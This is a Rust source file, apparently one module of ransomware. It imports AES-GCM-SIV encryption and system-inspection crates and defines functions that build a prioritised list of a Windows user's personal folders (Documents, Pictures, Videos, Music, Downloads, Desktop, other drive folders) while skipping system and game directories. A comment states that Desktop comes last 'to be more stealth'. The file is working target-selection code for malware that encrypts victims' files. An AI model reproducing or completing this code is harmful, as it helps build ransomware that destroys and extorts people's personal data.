use aes_gcm_siv::aead::generic_array::typenum::Len;
use aes_gcm_siv::aead::{Aead, NewAead};
use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
use dirs;
use fs_extra;
use mountpoints;
use rand::prelude::*;
use rand::prelude::*;
use rand_hc::Hc128Rng;
use std::collections::{HashMap, HashSet};
use std::fs;
use std::path;
use std::str;
use sysinfo::{NetworkExt, NetworksExt, ProcessExt, RefreshKind, System, SystemExt};
use walkdir::WalkDir;

const NOT_IMPORTANT_DIRS: [&str; 22] = [
    "Microsoft",
    "PerfLogs",
    "Program Files",
    "Program Files (x86)",
    "ProgramData",
    "Recovery",
    //"System Volume Information",
    //"Users",
    //"Windows",
    "Portable Apps",
    "cygwin64",
    "MinGW",
    "Temp",
    "temp",
    "Android",
    "Games",
    "Steam",
    "SteamLibrary",
    "Origin",
    "OriginGames",
    "EpicGames",
    "Epic Games",
    "GOG",
    "GOG Games",
    "Battle.net",
];

const NOT_WANTED_DIRS: [&str; 3] = ["System Volume Information", "Users", "Windows"];

fn add_important_folder_paths_windows(vec: &mut Vec<String>) {
    // Adds the common folders in windows in order of importance leaving Desktop at the end to be more stealth.
    // Adds documents folder path to the vec
    let documents_path = match dirs::document_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds pictures path to the vec
    let pictures_path = match dirs::picture_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds videos folder path to the vec
    let video_path = match dirs::video_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds pictures folder path to the vec
    let audio_path = match dirs::audio_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds downloads folder path to the vec
    let downloads_path = match dirs::download_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    // Adds desktop folder path to the vec
    let desktop_path = match dirs::desktop_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => path_str.to_owned(),
            None => String::from(""),
        },
        None => String::from(""),
    };

    let documents_path_clone = documents_path.clone();
    let pictures_path_clone = pictures_path.clone();
    let video_path_clone = video_path.clone();
    let audio_path_clone = audio_path.clone();
    let downloads_path_clone = downloads_path.clone();
    let desktop_path_clone = desktop_path.clone();

    vec.push(documents_path);
    vec.push(pictures_path);
    vec.push(video_path);
    vec.push(audio_path);
    vec.push(desktop_path);
    vec.push(downloads_path);

    // Adds all the remaining folders in the home folder (that weren't yet added)
    match dirs::home_dir() {
        Some(path) => match path.to_str() {
            Some(home_path) => {
                for path in fs::read_dir(home_path).unwrap() {
                    let path = path.unwrap().path();
                    if path.is_dir() {
                        let path = path.display().to_string();
                        let path_split: Vec<&str> = path.split("\\").collect();
                        let path_last_part = path_split.last().unwrap();
                        if path_last_part == &"Documents" && &path == &documents_path_clone {
                            continue;
                        } else if path_last_part == &"Pictures" && &path == &pictures_path_clone {
                            continue;
                        } else if path_last_part == &"Videos" && &path == &video_path_clone {
                            continue;
                        } else if path_last_part == &"Music" && &path == &audio_path_clone {
                            continue;
                        } else if path_last_part == &"Desktop" && &path == &desktop_path_clone {
                            continue;
                        } else if path_last_part == &"Downloads" && &path == &downloads_path_clone {
                            continue;
                        } else if path_last_part == &"AppData" {
                            continue;
                        }

                        vec.push(path);
                    }
                }
            }
            None => (),
        },
        None => (),
    };

    // Adds public folder path to the vec
    match dirs::public_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => vec.push(path_str.to_string()),
            None => (),
        },
        None => (),
    };
}

fn add_possible_important_folder_paths_on_drive_windows(
    drive_mount_path: &String,
    vec: &mut Vec<String>,
) {
    let drive_dirs = match fs::read_dir(drive_mount_path) {
        Ok(dirs) => dirs,
        Err(_) => return,
    };

    for path in drive_dirs {
        let path = match path {
            Ok(p) => p.path(),
            Err(_) => continue,
        };

        if path.is_dir() {
            let path = path.display().to_string();
            let path_split: Vec<&str> = path.split("\\").collect();
            if NOT_WANTED_DIRS.contains(path_split.last().unwrap()) {
                continue;
            } else if !NOT_IMPORTANT_DIRS.contains(path_split.last().unwrap()) {
                vec.push(path);
            }
        }
    }
}

fn add_non_important_folder_paths_on_drive_windows(
    drive_mount_path: &String,
    vec: &mut Vec<String>,
) {
    let drive_dirs = match fs::read_dir(drive_mount_path) {
        Ok(dirs) => dirs,
        Err(_) => return,
    };

    for path in drive_dirs {
        let path = match path {
            Ok(p) => p.path(),
            Err(_) => continue,
        };

        if path.is_dir() {
            let path = path.display().to_string();
            let path_split: Vec<&str> = path.split("\\").collect();
            if NOT_WANTED_DIRS.contains(path_split.last().unwrap()) {
                continue;
            } else if NOT_IMPORTANT_DIRS.contains(path_split.last().unwrap()) {
                vec.push(path);
            }
        }
    }
}

pub fn add_valuable_folder_paths_windows(vec: &mut Vec<String>) {
    add_important_folder_paths_windows(vec);

    match mountpoints::mountpaths() {
        Ok(mountpaths) => {
            for mountpath in &mountpaths {
                add_possible_important_folder_paths_on_drive_windows(&mountpath, vec);
            }
        }
        Err(_) => (),
    }
}

pub fn add_non_valuable_folder_paths_windows(vec: &mut Vec<String>) {
    match mountpoints::mountpaths() {
        Ok(mountpaths) => {
            for mountpath in &mountpaths {
                add_non_important_folder_paths_on_drive_windows(&mountpath, vec);
            }
        }
        Err(_) => (),
    }

    match dirs::data_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => vec.push(path_str.to_string().replace("\\Roaming", "")),
            None => (),
        },
        None => (),
    };
}

pub fn get_home_dir() -> Option<String> {
    match dirs::home_dir() {
        Some(path) => match path.to_str() {
            Some(path_str) => Some(path_str.to_owned()),
            None => None,
        },
        None => None,
    }
}
